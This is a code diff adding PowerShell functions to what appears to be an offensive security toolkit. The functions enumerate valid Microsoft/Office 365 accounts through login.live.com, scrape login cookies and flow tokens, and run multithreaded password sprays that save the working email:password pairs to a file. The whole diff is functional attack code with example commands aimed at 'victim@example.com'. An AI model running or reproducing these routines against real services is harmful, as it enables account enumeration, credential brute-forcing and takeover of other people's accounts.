@@ -3889,3 +3889,403 @@ Function Invoke-AddGmailRule{
             Write-Output "[*] Success! The rule has been added successfuly`n"
         }
 }
+function Invoke-UsernameHarvestO365 {
+    <#
+    .SYNOPSIS
+    Enumerates user accounts that are within the MS Office portal.
+    
+    .DESCRIPTION
+    Enumerates user accounts by querying login.live.com. The response returns
+    IfExistsResult, which translates to:
+        0 => User account exists
+        1 => User account does not exist.
+
+    Function: Invoke-UsernameHarvestO365
+    Author: Dwight Hohnstein (@djhohnstein)
+    License: MIT
+    Required Dependencies: PowerShell 3.0 or above.
+    Optional Dependencies: None
+
+    .PARAMETER EmailAddress
+    Determine if specified email address lives within Microsoft's domain.
+    
+    .PARAMETER EmailList
+    List of emails to validate
+    
+    .PARAMETER OutFile
+    Write list of successful emails to file.
+    
+    .EXAMPLE
+    Determine if single account exists:
+
+    Invoke-UsernameHarvestO365 -EmailAddress victim@example.com
+    .EXAMPLE
+    Enumerate a list of users and write results to outfile:
+
+    Invoke-UsernameHarvest -EmailList emails.txt | % { $_.Name } | Out-File valid_emails.txt
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Position=0, Mandatory=$false)]
+        [string]
+        $EmailAddress = "",
+        
+        [Parameter(Position=1, Mandatory=$false)]
+        [string]
+        $EmailList = "",
+
+        [Parameter(Position=2, Mandatory=$false)]
+        [string]
+        $OutFile = ""
+    )
+
+    if ($EmailAddress -eq "" -and $EmailList -eq "")
+    {
+        Write-Output "[-] Require -EmailAddress or -EmailList parameter to be specified"
+        break
+    }
+
+    $tokens = Read-MsftLoginTokens
+    $MSPOK = $tokens.MSPOK
+    $FlowToken = $tokens.FlowToken
+    Write-Verbose "Retrieved MSPOK Cookie: $MSPOK"
+    Write-Verbose "Retrieved flowToken: $FlowToken"
+
+    # # Get the MSPOK and PPFT tokens
+    # $request = [System.Net.WebRequest]::Create("https://login.live.com/login.srf")
+    # $response = $request.GetResponse()
+    # $cookieString = $response.GetResponseHeader("Set-Cookie")
+    # $mspokIndex = $cookieString.IndexOf("MSPOK")
+    # $semiColonIndex = $cookieString.IndexOf(";", $mspokIndex)
+    # $MSPOK = $cookieString.Substring($mspokIndex, $semiColonIndex-$mspokIndex).Split("=")[1]
+    # Write-Verbose "Retrieved MSPOK Cookie: $MSPOK"
+    # # PPFT/flowToken Index retrieval
+    # $stream = $response.GetResponseStream()
+    # $streamReader = New-Object System.IO.StreamReader $stream
+    # $htmlResp = $streamReader.ReadToEnd()
+    # $ppftIndex = $htmlResp.IndexOf("name=`"PPFT`"")
+    # $endInputIndex = $htmlResp.IndexOf("/>", $ppftIndex)
+    # $valueIndex = $htmlResp.IndexOf("value=`"", $ppftIndex)
+    # if ($valueIndex -gt $endInputIndex)
+    # {
+    #     Write-Error "Could not retrieve value of PPFT token. This indicates that the HTML structure of the document has changed. Open an issue report on Github!"
+    # }
+    # else
+    # {
+    #     $firstQuote = $valueIndex + 7
+    #     $endValue = $htmlResp.IndexOf("`"", $firstQuote)
+    #     $flowToken = $htmlResp.Substring($firstQuote, $endValue - $firstQuote)
+    #     Write-Verbose "Retrieved PPFT/flowToken: $flowToken"
+    $baseRequest = [System.Net.WebRequest]::Create("https://login.live.com/GetCredentialType.srf")
+    $baseRequest.Headers.Add("Cookie", "MSPOK=$MSPOK;")
+    $baseRequest.Headers.Add("Content-type", "application/json; charset=UTF-8")
+    $baseRequest.Method = "POST"
+
+    $uri = "https://login.live.com/GetCredentialType.srf"
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Host", "login.live.com")
+    $headers.Add("Connection", "close")
+    $headers.Add("Origin", "https://login.live.com")
+    $headers.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36")
+    $headers.Add("Content-type", "application/json; charset=UTF-8")
+    $headers.Add("Accept", "application/json")
+    $headers.Add("Accept-Encoding", "gzip, deflate")
+    $headers.Add("Accept-Language", "en-US,en;q=0.9")
+    $headers.Add("Cookie", "MSPOK=$MSPOK;")
+
+    $FullResults = @()
+
+    if ($EmailList -ne "")
+    {
+        $Emails = Get-Content $EmailList
+    }
+    else
+    {
+        $Emails = $EmailAddress
+    }
+    Write-Verbose "Beginning email enumeration."
+    ForEach($Email in $Emails)
+    {
+        $post = "{`"username`":`"$Email`",`"uaid`":`"`",`"isOtherIdpSupported`":false,`"checkPhones`":false,`"isRemoteNGCSupported`":true,`"isCookieBannerShown`":false,`"isFidoSupported`":false,`"flowToken`":`"$FlowToken`"}"
+        $request = Invoke-WebRequest -Uri $uri -Headers $headers -Method POST -Body $post
+        $results = $request.Content | ConvertFrom-JSON
+        if ($results.IfExistsResult -eq 0)
+        {
+            Write-Host -ForegroundColor "green" "[*] SUCCESS! $email has an O365 Account."
+            $FullResults += $email
+        }
+    }
+    Write-Verbose "Enumeration complete."
+    if($OutFile -ne "")
+    {
+        Write-Verbose "Writing results to $OutFile"
+        $FullResults | Out-File -Encoding ascii -Append $OutFile
+    }
+}
+
+function Invoke-PasswordSprayO365 {
+    <#
+    .SYNOPSIS
+    Given a list of valid O365 accounts, spray one or
+    many passwords to verify their validity.
+
+    .DESCRIPTION
+    This module connects first to login.live.com to retrieve
+    the requisite login tokens, then cycles through a password
+    or list of passwords. Then, for each email given, it will
+    attempt to login with the given password(s).
+
+    Function: Invoke-PasswordSprayO365
+    Author: Dwight Hohnstein (@djhohnstein)
+    License: MIT
+    Required Dependencies: PowerShell 3.0 or above.
+    Optional Dependencies: None
+
+    .PARAMETER EmailAddress
+    An email address to attempt to login against.
+
+    .PARAMETER EmailList
+    A list of emails to test against, one per line.
+
+    .PARAMETER Password
+    Password to login with.
+
+    .PARAMETER PasswordList
+    List of passwords to try and login with.
+
+    .Parameter Threads
+    Number of threads to run. Default 5.
+
+    .PARAMETER OutFile
+
+    .EXAMPLE
+    A single login attempt:
+
+    Invoke-PasswordSprayO365 -EmailAddress victim@example.com -Password Spring2018!
+
+    .EXAMPLE
+    Spray two passwords across several accounts and write results to file.
+
+    Invoke-PasswordsprayO365 -EmailList ./emails.txt -PasswordList ./passwords.txt -Threads 3 -OutFile success.txt
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Position=0, Mandatory=$False)]
+        [string]
+        $EmailAddress = "",
+
+        [Parameter(Position=1, Mandatory=$False)]
+        [string]
+        $EmailList = "",
+
+        [Parameter(Position=2, Mandatory=$False)]
+        [string]
+        $Password = "",
+
+        [Parameter(Position=3, Mandatory=$False)]
+        [string]
+        $PasswordList = "",
+
+        [Parameter(Position=4, Mandatory=$False)]
+        [int]
+        $Threads = 5,
+
+        [Parameter(Position=5, Mandatory=$False)]
+        [string]
+        $OutFile = ""
+    )
+
+    if ($EmailAddress -eq "" -and $EmailList -eq "")
+    {
+        Write-Error "Invalid number of arguments given. Require -EmailAddress or -EmailList"
+    }
+    elseif ($Password -eq "" -and $PasswordList -eq "")
+    {
+        Write-Error "Invalid number of arguments given. Require -Password or -PasswordList"
+    }
+    else
+    {
+        # Passed a single password to test against
+        if ($Password)
+        {
+            $Passwords = $Password
+        }
+        # Password list is given
+        else
+        {
+            $Passwords = Get-Content $PasswordList
+        }
+        if ($EmailList)
+        {
+            $Emails = Get-Content $EmailList
+        }
+        else
+        {
+            $Emails = $EmailAddress
+        }
+        $tokens = Read-MsftLoginTokens
+        # Write-Host -ForegroundColor "yellow" "[*] Now spraying O365 Portal at https://login.live.com"
+        # Rewrite of the Gmail Spray threading block
+        $EmailCount = $Emails.Count
+        $PasswordCount = $Passwords.Count
+        $UserList = @{}
+        $Sprayed = @()
+        $Count = 0
+        # Populate the Email/Password Lists
+        $Emails | % { $UserList[$Count % $Threads] += @($_); $Count++ }
+
+        $MSPOK = $tokens.MSPOK
+        $FlowToken = $tokens.FlowToken
+        $uri = "https://login.live.com/ppsecure/post.srf"
+        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+        $headers.Add("Host", "login.live.com")
+        $headers.Add("Connection", "close")
+        $headers.Add("Cache-Control", "max-age=0")
+        $headers.Add("Origin", "https://login.live.com")
+        $headers.Add("Upgrade-Insecure-Requests", "1")
+        $headers.Add("Content-Type", "application/x-www-form-urlencoded")
+        $headers.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36")
+        $headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")
+        $headers.Add("Accept-Encoding", "gzip, deflate")
+        $headers.Add("Accept-Language", "en-US,en;q=0.9")
+        $headers.Add("Cookie", "MSPOK=$MSPOK;")
+
+        # Start spraying
+        ForEach($Password in $Passwords)
+        {
+            Write-Verbose "Beginning spray attack with password: $Password"
+            0..($Threads - 1) | % {
+                Start-Job -ScriptBlock {
+                    $Password = $args[1]
+                    $FlowToken = $args[-1]
+                    $uri = $args[2]
+                    $headers = $args[3]
+                    ForEach($Email in $args[0])
+                    {
+                        $PostData = "i13=0&login=$Email&loginfmt=$Email&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=$Password&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=$FlowToken&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=0&i18=__ConvergedLoginPaginatedStrings%7C1%2C__ConvergedLogin_PCore%7C1%2C&i19=26144"
+                        # Ugly try catch since 302 is a terminating error in Invoke-WebRequest
+                        try
+                        {
+                            $Request = Invoke-WebRequest -Uri $uri -Headers $headers -Method POST -Body $PostData -MaximumRedirection 0
+                            if ($Request.StatusCode -ne 200)
+                            {
+                                Write-Host -ForegroundColor "red" "Unknown error code returned: " $Request.StatusCode
+                            }
+                        }
+                        catch
+                        {
+                            if ($Error[0].Exception.Response.StatusCode -eq "Found")
+                            {
+                                Write-Output "[*] SUCCESS! User: $Email Password: $Password"
+                            }
+                        }
+                    }
+                    # Build the request
+                } -ArgumentList $UserList[$_], $Password, $uri, $headers, $FlowToken | Out-Null
+            }
+            $Complete = Get-Date
+            $MaxWaitAtEnd = 10000
+            $SleepTimer = 200
+            $FullResults = @()
+            While($(Get-Job -State Running).Count -gt 0)
+            {
+                $RunningJobs = ""
+                ForEach($Job in $(Get-Job -State Running))
+                {
+                    $RunningJobs += ", $($Job.name)"
+                }
+                $RunningJobs = $RunningJobs.Substring(2)
+                Write-Progress -Activity "Spraying password $Password..." -Status "$($(Get-Job -State Running).Count) threads remaining" -PercentComplete ($(Get-Job -State Completed).Count / $(Get-Job).Count * 100)
+                if($(New-TimeSpan $Complete $(Get-Date)).TotalSeconds -ge $MaxWaitAtEnd)
+                {
+                    Write-Host -ForegroundColor "red" "Time expired. Killing remaining jobs..."
+                    Get-Job -State Running | Remove-Job -Force
+                }
+                else
+                {
+                    Start-Sleep -Milliseconds $SleepTimer
+                    ForEach($Job in Get-Job)
+                    {
+                        $JobOutput = Receive-Job $Job
+                        if ($JobOutput)
+                        {
+                            Write-Host -ForegroundColor "green" $JobOutput
+                            $FullResults += $JobOutput
+                        }
+                    }
+                }
+            }
+            Write-Verbose ("[*] A total of " + $FullResults.Count + " account(s) used password: $Password")
+            if ($OutFile -ne "")
+            {
+                Write-Verbose "Writing results to $OutFile"
+                $FullResults = $FullResults -Replace '\[\*\] SUCCESS! User:', ''
+                $FullResults = $FullResults -Replace " Password: ", ":"
+                $FullResults | Out-File -Encoding ascii -Append $OutFile
+            }
+        }
+        if ($OutFile -ne "")
+        {
+            Write-Output "Results have been written to $OutFile"
+        }
+    }
+}
+
+function Read-MsftLoginTokens {
+    <#
+    .SYNOPSIS
+    Retrieve the necessary tokens to prime username enumeration
+    and password spraying.
+
+    .DESCRIPTION
+    This module retrieves the MSPOK cookie and PPFT flow token from
+    the login.live.com page. These two items are responsible for a
+    genuine login attempt. If these values cannot be retrieved, an
+    error is thrown. Otherwise, return a PSObject like:
+
+    {
+        MSPOK: "SomeCookie";
+        FlowToken: "SomeGreatToken";
+    }
+
+    Function: Read-MsftLoginTokens
+    Author: Dwight Hohnstein (@djhohnstein)
+    License: MIT
+    Required Dependencies: PowerShell 3.0 or above.
+    Optional Dependencies: None
+
+    .EXAMPLE
+    $tokens = Read-MsftLoginTokens
+
+    #>
+    $results = @{}
+    $request = [System.Net.WebRequest]::Create("https://login.live.com/login.srf")
+    $response = $request.GetResponse()
+    $cookieString = $response.GetResponseHeader("Set-Cookie")
+    $mspokIndex = $cookieString.IndexOf("MSPOK")
+    $semiColonIndex = $cookieString.IndexOf(";", $mspokIndex)
+    $MSPOK = $cookieString.Substring($mspokIndex, $semiColonIndex-$mspokIndex).Split("=")[1]
+    Write-Verbose "Retrieved MSPOK Cookie: $MSPOK"
+    # PPFT/flowToken Index retrieval
+    $stream = $response.GetResponseStream()
+    $streamReader = New-Object System.IO.StreamReader $stream
+    $htmlResp = $streamReader.ReadToEnd()
+    $ppftIndex = $htmlResp.IndexOf("name=`"PPFT`"")
+    $endInputIndex = $htmlResp.IndexOf("/>", $ppftIndex)
+    $valueIndex = $htmlResp.IndexOf("value=`"", $ppftIndex)
+    if ($valueIndex -gt $endInputIndex)
+    {
+        Write-Error "Could not retrieve value of PPFT token. This indicates that the HTML structure of the document has changed. Open an issue report on Github!"
+        return $results
+    }
+    else
+    {
+        $firstQuote = $valueIndex + 7
+        $endValue = $htmlResp.IndexOf("`"", $firstQuote)
+        $FlowToken = $htmlResp.Substring($firstQuote, $endValue - $firstQuote)
+        Write-Verbose "Retrieved FlowToken: $FlowToken"
+        $results.MSPOK = $MSPOK
+        $results.FlowToken = $FlowToken
+        return $results
+    }
+}
